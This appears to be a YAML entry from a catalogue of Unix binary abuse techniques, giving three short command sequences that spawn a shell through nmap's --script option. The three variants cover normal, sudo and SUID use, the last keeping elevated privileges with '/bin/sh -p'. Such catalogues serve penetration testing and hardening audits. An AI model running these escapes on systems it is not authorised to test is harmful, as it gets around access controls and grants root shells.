---
functions:
  execute-interactive:
    - description: Echoing of input characters is disabled.
      code: |
        TF=$(mktemp)
        echo 'os.execute("/bin/sh")' > $TF
        nmap --script=$TF
  sudo-enabled:
    - description: Echoing of input characters is disabled.
      code: |
        TF=$(mktemp)
        echo 'os.execute("/bin/sh")' > $TF
        sudo nmap --script=$TF
  suid-enabled:
    - description: Echoing of input characters is disabled.
      code: |
        TF=$(mktemp)
        echo 'os.execute("/bin/sh -p")' > $TF
        ./nmap --script=$TF
---
